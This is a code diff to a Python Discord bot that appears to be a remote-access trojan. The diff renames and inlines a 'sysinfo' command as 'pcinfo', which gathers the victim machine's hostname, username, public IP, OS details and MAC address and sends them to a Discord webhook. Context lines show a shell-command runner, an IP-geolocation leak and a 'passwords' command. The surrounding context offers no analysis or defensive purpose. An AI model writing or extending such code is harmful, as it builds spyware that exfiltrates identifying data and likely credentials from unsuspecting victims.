@@ -10,6 +10,7 @@ import socket
 import platform
 import getpass
 import requests
+import uuid
 from discord.ext import commands
 from dotenv import load_dotenv
 import sqlite3
@@ -70,42 +71,6 @@ def get_ip_geolocation(ip):
         return {'ip': ip, 'error': 'Geolocation failed'}
     except:
         return {'ip': ip, 'error': 'Request failed'}
-
-def get_system_info():
-    """Get detailed PC information"""
-    try:
-        hostname = socket.gethostname()
-        username = getpass.getuser()
-        system = platform.system()
-        release = platform.release()
-        version = platform.version()
-        machine = platform.machine()
-        processor = platform.processor()
-        
-        # Get Windows version details
-        win_ver = ""
-        if platform.system() == "Windows":
-            win_ver = f"Windows Version: {platform.win32_ver()[0]} {platform.win32_ver()[1]}"
-        
-        # Get MAC address
-        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
-        
-        # Get IP
-        ip = get_public_ip()
-        
-        return {
-            'hostname': hostname,
-            'username': username,
-            'system': f"{system} {release}",
-            'win_ver': win_ver,
-            'version': version,
-            'architecture': machine,
-            'processor': processor,
-            'mac': mac,
-            'ip': ip
-        }
-    except Exception as e:
-        return {'error': str(e)}
 
 def run_command(cmd):
     try:
@@ -401,19 +366,35 @@ async def ip(ctx):
     await ctx.send("IP information sent to webhook.")
 
 @bot.command()
-async def sysinfo(ctx):
+async def pcinfo(ctx):
     """Get detailed PC information"""
-    await ctx.send("Collecting system information...")
+    await ctx.send("Collecting PC information...")
     
-    info = get_system_info()
-    
-    if 'error' in info:
-        output = f"Error: {info['error']}"
-    else:
-        output = f"Hostname: {info['hostname']}\nUsername: {info['username']}\nOS: {info['system']}\n{info['win_ver']}\nVersion: {info['version']}\nArchitecture: {info['architecture']}\nProcessor: {info['processor']}\nMAC Address: {info['mac']}\nIP Address: {info['ip']}"
-    
-    await send_webhook(f"**SYSTEM INFORMATION**\n```\n{output}\n```")
-    await ctx.send("System information sent to webhook.")
+    try:
+        hostname = socket.gethostname()
+        username = getpass.getuser()
+        ip = get_public_ip()
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+        
+        # Get MAC address
+        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
+        
+        # Get Windows version
+        win_ver = ""
+        if platform.system() == "Windows":
+            win_ver = f"Windows Version: {platform.win32_ver()[0]} {platform.win32_ver()[1]}"
+        
+        output = f"Hostname: {hostname}\nUsername: {username}\nIP Address: {ip}\nOS: {system} {release}\n{win_ver}\nOS Version: {version}\nArchitecture: {machine}\nProcessor: {processor}\nMAC Address: {mac}"
+        
+        await send_webhook(f"**PC INFORMATION**\n```\n{output}\n```")
+        await ctx.send("PC information sent to webhook.")
+        
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
 async def passwords(ctx):
